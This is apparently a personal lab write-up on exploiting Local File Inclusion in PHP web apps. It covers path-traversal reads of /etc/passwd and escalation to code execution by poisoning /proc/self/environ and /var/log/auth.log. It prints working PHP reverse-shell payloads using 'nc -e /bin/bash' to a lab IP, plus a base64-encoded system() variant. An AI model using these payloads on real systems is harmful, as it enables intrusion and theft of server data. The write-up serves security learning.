# What is LFI?

**LFI (Local File Inclusion)** is a vulnerability that allows an attacker to make the web application **include or read local files** from the server by controlling an input parameter.

Instead of including the intended file, the attacker can force the application to include arbitrary files on the server.

---

# Why is LFI Dangerous?

An LFI vulnerability may allow an attacker to:

- Read sensitive system files.
- View the application's source code.
- Leak database credentials.
- In some cases, achieve **Remote Code Execution (RCE)**.

---

## Reading Sensitive Files

One of the first goals is reading important system files such as:

```text
/etc/passwd
```

---

## Viewing Source Code

LFI can expose the source code of PHP applications, allowing an attacker to discover hidden functionality or sensitive information.

---

## Leaking Database Credentials

Configuration files often contain database usernames and passwords.

For example:

```php
config.php
wp-config.php
```

---

## Remote Code Execution (RCE)

Although LFI is primarily a file-reading vulnerability, it can sometimes be escalated to **RCE** if the attacker can include a file that contains executable PHP code.

---

# How to Detect LFI

Look for parameters such as:

```text
?page=
?file=
?include=
?lang=
?template=
?view=
?module=
```

Then attempt a directory traversal attack:

```text
?page=../../../../etc/passwd
```

If the contents of `/etc/passwd` are displayed, the application is vulnerable to LFI.

---

# Why Do We Use Files Such As?

```text
/proc/self/environ
```

LFI alone only allows us to **read files**.

To execute code, we need to include a file whose contents we can control.

This technique is known as **File Inclusion to RCE**.

---

## 1. /proc/self/environ

This file contains the environment variables of the current HTTP request.

It often includes values such as:

- User-Agent
- Cookie
- Referer

If we inject PHP code into one of these headers, the code is written inside this file.

Later, when we include:

```text
/proc/self/environ
```

PHP executes our injected payload.

---

## 2. Log Files

Common log files include:

```text
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
```

If we send a request containing PHP code inside the User-Agent or another logged field, the payload is written into the log file.

Including that log file through the LFI vulnerability causes PHP to execute the injected code.

This technique is called **Log Poisoning**.

---

## 3. PHP Session Files

PHP stores user sessions in files such as:

```text
/var/lib/php/sessions/sess_xxxxx
```

If an attacker can control the session contents, PHP code may be injected into the session file and later executed through the LFI vulnerability.

---

# Lab

## Method 1 — Reading Files

After testing the application, we discovered that the page parameter was vulnerable to LFI.

![[Pasted image 20260428164144.png]]

We used:

```text
../
```

to move one directory backward.

By repeating `../` several times, we eventually reached the root directory and accessed any readable file.

For example:

```text
/etc/passwd
```

![[Pasted image 20260704220411.png]]

Using this technique, we can read any file that the web server has permission to access.

---

## Method 2 — Getting a Reverse Shell via `/proc/self/environ`

Reading files is useful, but our goal is to execute commands.

First, we included:

```text
/proc/self/environ
```

Then we intercepted the request using Burp Suite.

![[Pasted image 20260704220614.png]]

Inside the **User-Agent** header, we injected a simple PHP payload to verify whether PHP code would execute.

```php
<?php phpinfo(); ?>
```

After forwarding the request and including `/proc/self/environ` again, the `phpinfo()` page appeared.

![[Pasted image 20260428210520.png]]

This confirmed that PHP code inside the User-Agent was being executed.

Next, we replaced it with a Reverse Shell payload.

```php
<?php passthru("nc -e /bin/bash 192.168.227.128 4444"); ?>
```

![[Pasted image 20260428210641.png]]

Before triggering the payload, we started a Netcat listener.

![[Pasted image 20260704220838.png]]

After requesting `/proc/self/environ` again, the payload executed and we received a Reverse Shell.

![[Pasted image 20260704220902.png]]

---

# Method 3 — Log Poisoning via `/var/log/auth.log`

The SSH authentication log records every login attempt.

The file is located at:

```text
/var/log/auth.log
```

If we use PHP code as the SSH username, the payload will be written into the log file.

Later, including the log file through the LFI vulnerability causes PHP to execute the injected code.

First, we viewed the log file.

![[Pasted image 20260429103504.png]]

To verify that usernames were being logged, we attempted to log in using a random username.

![[Pasted image 20260429103612.png]]

Next, we started a Netcat listener and replaced the SSH username with a PHP Reverse Shell payload.

```php
<?php passthru('nc -e /bin/bash IP PORT'); ?>
```

![[Pasted image 20260429103735.png]]

The payload contains spaces and special characters, which may prevent it from being stored correctly.

To avoid this problem, we encoded the command using **Base64** with Burp Suite's Decoder.

![[Pasted image 20260429103916.png]]

Then we modified the PHP payload to decode and execute the Base64 string.

```php
<?php system(base64_decode("BASE64_PAYLOAD")); ?>
```

![[Pasted image 20260429104050.png]]

We attempted another SSH login using the payload as the username and any password so that it would be written into the log file.

![[Pasted image 20260429104147.png]]

Finally, after including:

```text
/var/log/auth.log
```

through the LFI vulnerability, PHP executed our payload and we obtained a Reverse Shell.

![[Pasted image 20260429104224.png]]

---

# Common Files Used to Turn LFI into RCE

```text
/proc/self/environ
/var/log/auth.log
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/lib/php/sessions/sess_<SESSION_ID>
```